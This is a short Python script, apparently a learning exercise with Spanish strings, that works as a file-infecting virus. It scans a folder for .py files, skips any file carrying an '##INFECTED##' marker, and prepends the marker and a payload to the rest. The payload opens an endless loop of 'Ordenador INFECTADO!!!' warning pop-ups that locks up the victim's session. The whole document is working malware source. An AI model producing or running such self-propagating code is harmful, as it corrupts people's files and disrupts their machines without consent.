import glob

virus_msg = '''
import tkinter as tk
from tkinter import messagebox
root = tk.Tk()
root.withdraw()
while True:
    tk.messagebox.showwarning("Hola, tonto!", "Ordenador INFECTADO!!!")
    
'''

infected_str = '##INFECTED##'
is_infected = False
files = glob.glob('ficheros_a_infectar/*.py')

print(files)

for file in files:
    f = open(file, 'r')
    code = f.readlines()
    f.close()
    print(code)
    new_code = ''
    for line in code:
        if infected_str in line:
            is_infected = True
            break

    if not is_infected:
        new_f = open(file, 'w')
        new_f.write(infected_str+'\n')
        new_f.write(virus_msg)
        # for line_code in code:
        #     new_f
        new_f.writelines(code)

        new_f.close()

